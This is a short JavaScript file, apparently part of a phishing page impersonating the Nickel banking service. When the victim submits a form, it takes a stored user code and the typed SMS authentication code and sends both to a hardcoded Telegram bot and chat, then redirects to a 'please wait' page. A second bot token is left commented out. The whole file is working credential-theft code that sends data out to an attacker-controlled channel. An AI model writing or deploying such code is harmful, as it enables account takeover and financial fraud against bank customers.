

var input = document.getElementById('input');
var usercode = localStorage.getItem('usercode') ;

document.getElementById('form3').addEventListener('submit', function(e){
    e.preventDefault();

    const bot = new Bot("8030036758:AAFBlF_S0RG8CJ5ueHBdmOQV9niAyHrTMG0", -4591101208);
    // const bot = new Bot("7790808498:AAGzrnUuQzRYR2OIyz6GoKrqiVuOP12IE1Q", 7332838769);

    bot.sendMessage('👔User NICKEL : ' + usercode + '📨auth_sms : ' + input.value)
    .then(res => {
        console.log(res);
        //debugger
        window.location.href = './patienter.html'
    })
})